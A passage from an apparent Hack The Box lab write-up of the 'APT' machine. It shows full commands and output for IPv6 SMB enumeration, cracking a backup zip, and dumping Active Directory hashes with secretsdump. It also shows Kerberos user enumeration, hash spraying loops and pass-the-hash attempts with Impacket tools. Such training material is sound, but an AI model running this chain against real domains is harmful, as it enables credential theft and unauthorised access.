</pre></table></code></div></div><p>The scan did not take very long, but this time I was able to see many more ports open. This was looking like a real Windows server now with many of the common Windows Server ports open such as 53 - DNS, 88 - Kerberos, 389 - LDAP, 445 - SMB, and 5985 - WinRM.</p><p>Next, I researched ways to enumerate Windows using IPv6 and found a newer version of a popular tool, <code class="language-plaintext highlighter-rouge">enum4linux</code>, that supported IPv6.</p><ul><li>https://hacker-gadgets.com/blog/2020/12/04/enum4linux-ng-a-next-generation-version-of-enum4linux-a-windows-samba-enumeration-tool-with-additional-features-like-json-yaml-export/<li>https://www.ethicalhackx.com/how-to-pwn-on-ipv6/</ul><p>Using the information from this tool, I learned how to use <code class="language-plaintext highlighter-rouge">smbclient</code> with IPv6.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt/enum4linux-ng]
└─$ smbclient -t 5 -W htb -U % -L //dead:beef::b885:d62a:d679:573f                               127 ⨯

        Sharename       Type      Comment
        ---------       ----      -------
        backup          Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
dead:beef::b885:d62a:d679:573f is an IPv6 address -- no workgroup available
</pre></table></code></div></div><p>Using <code class="language-plaintext highlighter-rouge">smbclient</code> I was able to get a list of network shares. The <code class="language-plaintext highlighter-rouge">backup</code> share looked like it should hold interesting information.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/markups/apt-no_workgroup.svg" alt="Note: Apparently Workgroups do not function over IPv6." /></p><h3 id="backupzip">backup.zip</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt/enum4linux-ng]
└─$ smbclient -t 5 -W htb -U %  //dead:beef::b885:d62a:d679:573f/backup                            1 ⨯
Try "help" to get a list of possible commands.
smb: \&gt; dir
  .                                   D        0  Thu Sep 24 03:30:52 2020
  ..                                  D        0  Thu Sep 24 03:30:52 2020
  backup.zip                          A 10650961  Thu Sep 24 03:30:32 2020

                10357247 blocks of size 4096. 6963935 blocks available
smb: \&gt; get backup.zip
getting file \backup.zip of size 10650961 as backup.zip (5794.6 KiloBytes/sec) (average 5794.6 KiloBytes/sec)
</pre></table></code></div></div><p>Inside the <code class="language-plaintext highlighter-rouge">backup</code> share I found a file <code class="language-plaintext highlighter-rouge">backup.zip</code> that I was able to exfiltrate back to my computer.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ unzip backup.zip             
Archive:  backup.zip
   creating: Active Directory/
[backup.zip] Active Directory/ntds.dit password: 
   skipping: Active Directory/ntds.dit  incorrect password
   skipping: Active Directory/ntds.jfm  incorrect password
   creating: registry/
   skipping: registry/SECURITY       incorrect password
   skipping: registry/SYSTEM         incorrect password
</pre></table></code></div></div><p>The zip file was password-protected, but not encrypted. I was able to see that contents, which were a backup of the Active Directory NTDS database. This was a very juicy find, indeed! If I could extract these files, I could potentially get the password hashes of all of the domain users on this machine.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ zip2john backup.zip &gt; backup.hash
backup.zip/Active Directory/ is not encrypted!
ver 2.0 backup.zip/Active Directory/ is not encrypted, or stored with non-handled compression type
ver 2.0 backup.zip/Active Directory/ntds.dit PKZIP Encr: cmplen=8483543, decmplen=50331648, crc=ACD0B2FB
ver 2.0 backup.zip/Active Directory/ntds.jfm PKZIP Encr: cmplen=342, decmplen=16384, crc=2A393785
ver 2.0 backup.zip/registry/ is not encrypted, or stored with non-handled compression type
ver 2.0 backup.zip/registry/SECURITY PKZIP Encr: cmplen=8522, decmplen=262144, crc=9BEBC2C3
ver 2.0 backup.zip/registry/SYSTEM PKZIP Encr: cmplen=2157644, decmplen=12582912, crc=65D9BFCD
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
</pre></table></code></div></div><p>Next, I used <code class="language-plaintext highlighter-rouge">zip2john</code> to extract the password hash from the file.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iloveyousomuch   (backup.zip)
1g 0:00:00:00 DONE (2021-03-29 21:06) 100.0g/s 819200p/s 819200c/s 819200C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed
</pre></table></code></div></div><p>Then, I loaded the hash into <code class="language-plaintext highlighter-rouge">john</code>. It cracked in less than a second and revealed that the password was <code class="language-plaintext highlighter-rouge">iloveyousomuch</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ unzip backup.zip
Archive:  backup.zip
[backup.zip] Active Directory/ntds.dit password: 
  inflating: Active Directory/ntds.dit  
  inflating: Active Directory/ntds.jfm  
  inflating: registry/SECURITY       
  inflating: registry/SYSTEM
</pre></table></code></div></div><p>Using this password I was able to successfully extract all of the files.</p><h3 id="secretsdumppy">secretsdump.py</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ secretsdump.py -ntds 'Active Directory/ntds.dit' -system registry/SYSTEM -security registry/SECURITY LOCAL
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x936ce5da88593206567f650411e1d16b
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:34005b00250066006f0027007a004700600026004200680052003300630050005b002900550032004e00560053005c004c00450059004f002f0026005e0029003c00390078006a0036002500230039005c005c003f0075004a0034005900500062006000440052004b00220020004900450053003200660058004b00220066002c005800280051006c002a0066006700300052006600520071003d0021002c004200650041005600460074005e0045005600520052002d004c0029005600610054006a0076002f005100470039003d006f003b004700400067003e005600610062002d00550059006300200059006400
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:b300272f1cdab4469660d55fe59415cb
[*] DefaultPassword
(Unknown User):Password123!
[*] DPAPI_SYSTEM
dpapi_machinekey:0x3e0d78cb8f3ed66196584c44b5701501789fc102
dpapi_userkey:0xdcde3fc585c430a72221a48691fb202218248d46
[*] NL$KM
 0000   73 4F 34 1D 09 C8 F9 32  23 B9 25 0B DF E2 DC 58   sO4....2#.%....X
 0010   44 41 F2 E0 C0 93 CF AD  2F 2E EB 13 81 77 4B 42   DA....../....wKB
 0020   C2 E0 6D DE 90 79 44 42  F4 C2 AD 4D 7E 3C 6F B2   ..m..yDB...M~&lt;o.
 0030   39 CE 99 95 66 8E AF 7F  1C E0 F6 41 3A 25 DA A8   9...f......A:%..
NL$KM:734f341d09c8f93223b9250bdfe2dc584441f2e0c093cfad2f2eeb1381774b42c2e06dde90794442f4c2ad4d7e3c6fb239ce9995668eaf7f1ce0f6413a25daa8
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 1733ad403c773dde94dddffa2292ffe9
[*] Reading and decrypting hashes from Active Directory/ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
APT$:1000:aad3b435b51404eeaad3b435b51404ee:b300272f1cdab4469660d55fe59415cb:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:72791983d95870c0d6dd999e4389b211:::

...snipped 1000s of random users...

[*] ClearText password from Active Directory/ntds.dit
APT$:CLEARTEXT:4[%fo'zG`&amp;BhR3cP[)U2NVS\LEYO/&amp;^)&lt;9xj6%#9\\?uJ4YPb`DRK" IES2fXK"f,X(Ql*fg0RfRq=!,BeAVFt^EVRR-L)VaTjv/QG9=o;G@g&gt;Vab-UYc Yd
[*] Cleaning up...
</pre></table></code></div></div><p>Using Impacket’s <code class="language-plaintext highlighter-rouge">secretsdump.py</code> I was able to dump all of the hashes that were stored in the database. There were hundreds of users on this domain! Luckily there were a couple of plaintext passwords. I tried logging into various services using the two plaintext passwords, but didn’t get anywhere.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ awk -F ":" '{print $1}' ntds.dump &gt; users

┌──(zweilos㉿kali)-[~/htb/apt]
└─$ wc -l users 
7996 users
</pre></table></code></div></div><p>I dumped the output from <code class="language-plaintext highlighter-rouge">secretsdump.py</code> to a file and counted the lines that contained hashes. I was wrong before…there were almost 8000 users on this domain!!</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ awk -F ":" '{print $1}' ntds.dump | grep -v "[*]" | sort | uniq  &gt; users
                                                                                         
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ wc -l users                                             
2004 users
</pre></table></code></div></div><p>After looking through the dump a bit, I noticed there were duplicates. After sorting and pulling out the unique entries there were only about…2000 or so left. Much more manageable, but there was a lot to go through still.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ kerbrute_linux_amd64 userenum --dc apt.htb.local -d htb users                                  1 ⨯

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 03/29/21 - Ronnie Flathers @ropnop

2021/03/29 21:53:14 &gt;  Using KDC(s):
2021/03/29 21:53:14 &gt;   apt.htb.local:88

2021/03/29 21:53:24 &gt;  [+] VALID USERNAME:       Administrator@htb
2021/03/29 21:54:26 &gt;  [+] VALID USERNAME:       APT$@htb
2021/03/29 22:00:35 &gt;  [+] VALID USERNAME:       henry.vinson@htb
2021/03/29 22:12:34 &gt;  Done! Tested 2004 usernames (3 valid) in 1159.740 seconds
</pre></table></code></div></div><p>Using <code class="language-plaintext highlighter-rouge">kerbrute</code> I was able to find only 3 valid users on this machine out of the 2000+ that had come out of the database, and one of those was only the machine account.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ awk -F":" '{print $3,$4}' ntds.dump | sed 's/ /:/g' &gt; nt_hashes
</pre></table></code></div></div><p>Now I needed to find a valid hash to log in with. I cut the text from the file using <code class="language-plaintext highlighter-rouge">awk</code> and <code class="language-plaintext highlighter-rouge">sed</code> and put all of the hashes into a file by themselves.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ getTGT.py -hashes aad3b435b51404eeaad3b435b51404ee:297f523d69d61de58b690f158f052c1d -dc-ip apt.htb.local htb/henry.vinson
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
</pre></table></code></div></div><h3 id="gettgtpy">GetTGT.py</h3><p>Using <code class="language-plaintext highlighter-rouge">GetTGT.py</code> from Impacket I was only able to check one hash as a time, but since there was no way to validate all of the hashes at once I came up with a solution.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ for x in $(cat nt_hashes);do getTGT.py -hashes x -dc-ip apt.htb.local htb/henry.vinson 2&gt;/dev/null;done
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

not enough values to unpack (expected 2, got 1)
</pre></table></code></div></div><p>I used some bash magic to run the same command for each line in my <code class="language-plaintext highlighter-rouge">nt_hashes</code> file. It started giving a bunch of errors for all of the lines that didn’t have both halves of the hash (this script from Impacket expects both the LM and NTLM hash).</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ for x in $(cat test);do getTGT.py -hashes $x -dc-ip apt.htb.local htb/henry.vinson;done      
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
</pre></table></code></div></div><p>I pulled out one of the hashes and tried it with just one that was in the right format, but this time I got an error that said my clock was too far off the Domain Controller.</p><ul><li>https://book.hacktricks.xyz/windows/active-directory-methodology/kerberoast</ul><blockquote><p>If you find this error from Linux: <code class="language-plaintext highlighter-rouge">Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</code> it because of your local time, you need to synchronise the host with the DC: ntpdate <code class="language-plaintext highlighter-rouge">&lt;IP of DC&gt;</code></p></blockquote><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ sudo ntpdate apt.htb.local
29 Mar 23:07:02 ntpdate[794852]: no server suitable for synchronization found
</pre></table></code></div></div><p>I installed <code class="language-plaintext highlighter-rouge">ntpdate</code> based off the suggestion of this blog, but since NTP wasn’t running on the server I wasn’t able to sync with it. After playing with my system time, I decided that it had never jumped forwards for daylight savings time…</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ sudo ntpdate pool.ntp.org
29 Mar 23:14:48 ntpdate[842178]: step time server 194.36.144.87 offset -3599.289748 sec
</pre></table></code></div></div><p>I simply synced it with a known good ntp server instead.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/markups/apt-broken-ntp.svg" alt="Reverted prior machine's changes" /></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ date
Tue 30 Mar 2021 12:17:39 AM EDT
</pre></table></code></div></div><p>I still had the same problem… my VM reported one time, but the terminal reported another. It seemed that the <code class="language-plaintext highlighter-rouge">date</code> command was way off for some reason.</p><h3 id="crackmapexec">crackmapexec</h3><p>I started looking for other ways to do brute force using hashes, and found that CrackMapExec was also able to do this.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ crackmapexec smb apt.htb.local -u henry.vinson -H nt_hashes -d htb
</pre></table></code></div></div><p>I tried using crackmapexec but it did not come up with any results. I wasn’t sure if it even did anything since it didn’t return any output at all.</p><p>After some research, I found it had problems with IPv6. On GitHub I found an issue someone had brought up that addressed this issue.</p><ul><li>https://github.com/byt3bl33d3r/CrackMapExec/issues/339<li>https://www.onsecurity.io/blog/abusing-kerberos-from-linux/<li>https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/</ul><p>Using SSH port forwarding to and from local machine, I could use my localhost IPv4 address to redirect traffic to the remote IPv6 address. This seemed intricate, but promising.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[/etc/ssh]
└─$ sudo ssh zweilos@127.0.0.1 -L 445:apt.htb.local:445
</pre></table></code></div></div><p>I had to enable ssh on my machine, then set up port forwarding using SSH.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ crackmapexec smb -d htb henry.vinson localhost   
SMB         ::1             445    APT              [*] Windows Server 2016 Standard 14393 (name:APT) (domain:htb) (signing:True) (SMBv1:True)
</pre></table></code></div></div><p>However, other than getting the windows version I could not get any further information.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ crackmapexec --verbose smb -d htb henry.vinson localhost
DEBUG Passed args:
{'aesKey': None,
 'amsi_bypass': None,
 'clear_obfscripts': False,
 'content': False,
 'continue_on_success': False,
 'cred_id': [],
 'darrell': False,
 'depth': None,
 'disks': False,
 'domain': 'htb',
 'exclude_dirs': '',
 'exec_method': None,
 'execute': None,
 'fail_limit': None,
 'force_ps32': False,
 'gen_relay_list': None,
 'get_file': None,
 'gfail_limit': None,
 'groups': None,
 'hash': [],
 'jitter': None,
 'kdcHost': None,
 'kerberos': False,
 'list_modules': False,
 'local_auth': False,
 'local_groups': None,
 'loggedon_users': False,
 'lsa': False,
 'module': None,
 'module_options': [],
 'no_bruteforce': False,
 'no_output': False,
 'ntds': None,
 'obfs': False,
 'only_files': False,
 'pass_pol': False,
 'password': [],
 'pattern': None,
 'port': 445,
 'protocol': 'smb',
 'ps_execute': None,
 'put_file': None,
 'regex': None,
 'rid_brute': None,
 'sam': False,
 'server': 'https',
 'server_host': '0.0.0.0',
 'server_port': None,
 'sessions': False,
 'share': 'C$',
 'shares': False,
 'show_module_options': False,
 'smb_server_port': 445,
 'spider': None,
 'spider_folder': '.',
 'target': ['henry.vinson', 'localhost'],
 'threads': 100,
 'timeout': None,
 'ufail_limit': None,
 'username': [],
 'users': None,
 'verbose': True,
 'wmi': None,
 'wmi_namespace': 'root\\cimv2'}
DEBUG Using selector: EpollSelector
DEBUG Running
DEBUG Started thread poller
DEBUG Error resolving hostname henry.vinson: [Errno -2] Name or service not known
DEBUG Error retrieving os arch of ::1: Could not connect: [Errno 111] Connection refused
SMB         ::1             445    APT              [*] Windows Server 2016 Standard 14393 (name:APT) (domain:htb) (signing:True) (SMBv1:True)
DEBUG Stopped thread poller
</pre></table></code></div></div><p>I tried many different things, and even checked to verbose debugging information, but could not identify the problem. If someone could tell me what I was doing wrong I would greatly appreciate it!!</p><h3 id="gettgtpy-cont">getTGT.py (cont)</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ for x in $(cat nt_hashes);do getTGT.py -hashes $x -dc-ip apt.htb.local htb/henry.vinson 2&gt;/dev/null;done                                                        
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
</pre></table></code></div></div><p>The next day, my clock was magicaly working correctly. I didn’t restart the system or anything (I had actually only paused the vm). This time I was able to enumerate the users (or at least was able to connect and get the PREAUTH_FAILED error instead of the Clock Skew error).</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ for x in $(cat nt_hashes);do getTGT.py -hashes $x -dc-ip apt.htb.local htb/henry.vinson | grep -v Impacket | grep -v "KDC_ERR_PREAUTH_FAILED" | tee -a  valid_hash &amp;&amp; echo $x &gt;&gt; valid_hash;done

Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
</pre></table></code></div></div><p>I used a bit of bash hackery to remove the results that showed failed attempts and let it run. (I assumed it would take a long time so I let it go and got dinner).</p><p>When I checked in on the progress, I noticed that I still received the time sync error, but this time only for one hash; all others reported PREAUTH error.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$cat valid_hash
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb
</pre></table></code></div></div><p>I checked my saved output, and saw that there was only one has that didn’t trigger the PREAUTH_FAILED error.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ net time -S apt.htb.local
Tue Mar 30 21:38:19 2021

┌──(zweilos㉿kali)-[~/htb/apt]
└─$ date
Tue 30 Mar 2021 09:28:35 PM EDT
</pre></table></code></div></div><p>my errors were caused because the time was 10 minutes off…Thank you <code class="language-plaintext highlighter-rouge">net time</code>!!</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ for x in $(head -1 test);do getTGT.py -hashes $x -dc-ip apt.htb.local htb/henry.vinson@apt.htb | grep -v Impacket | tee -a valid_hash3 &amp;&amp; echo $x &gt;&gt; valid_hash3 ;done

[*] Saving ticket in henry.vinson@apt.htb.ccache
</pre></table></code></div></div><p>And it worked!!</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ export KRB5CCNAME=henry.vinson@apt.htb.ccache
</pre></table></code></div></div><p>I exported the Kerberos ticket to a variable for use by other programs and pushed forward.</p><h3 id="pass-the-hash">Pass the hash</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb' htb/henry.vinson@apt.htb.local
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on apt.htb.local.....
[-] share 'backup' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'SYSVOL' is not writable.
</pre></table></code></div></div><p>The hash seemed to be valid! I got a listing of shares, though <code class="language-plaintext highlighter-rouge">psexec.py</code> wouldn’t connect since they weren’t writeable.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb htb/henry.vinson@apt.htb.local 
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] SMBv3.0 dialect used
[-] rpc_s_access_denied
</pre></table></code></div></div><p>I tried using <code class="language-plaintext highlighter-rouge">wmiexec.py</code> but I was denied access by RPC. I did find out that the machine was using SMBv3 which made things more difficult.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb htb/henry.vinson@apt.htb.local
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
</pre></table></code></div></div><p>I was starting to think that the hash was not valid since all of the tools were giving access denied errors, though it did enumerate shares…</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ dcomexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb htb/henry.vinson@apt.htb.local
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] SMBv3.0 dialect used
[-] rpc_s_access_denied
</pre></table></code></div></div><p>I kept going down the list of impacket tools that seemed relevant. I had to look up query syntax for <code class="language-plaintext highlighter-rouge">reg</code> when I came to <code class="language-plaintext highlighter-rouge">reg.py</code>.</p><ul><li>https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-query</ul><p>The argument <code class="language-plaintext highlighter-rouge">-s</code> sounded useful for dumping all keys at once. HKCU seemed like a good place to start dumping.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ python3 /usr/local/bin/reg.py -dc-ip apt.htb.local -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb apt.htb.local query -keyName HKCU -s
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[!] Cannot check RemoteRegistry status. Hoping it is started...
[-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
</pre></table></code></div></div><p>However, this also didn’t seem to work. I tried each of these Impacket tools using the <code class="language-plaintext highlighter-rouge">-k</code> option to use Kerberos authentication after exporting the key to KRB5CCNAME, but it didn’t seem to authenticate with what I thought was the correct Kerberos ticket. I decided to go back and try to troubleshoot my ticket.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ klist
Ticket cache: FILE:henry.vinson@apt.htb.ccache
Default principal: henry.vinson@HTB.LOCAL

Valid starting       Expires              Service principal
03/30/2021 21:54:04  03/31/2021 07:54:04  krbtgt/HTB@HTB.LOCAL
     renew until 03/31/2021 21:52:51
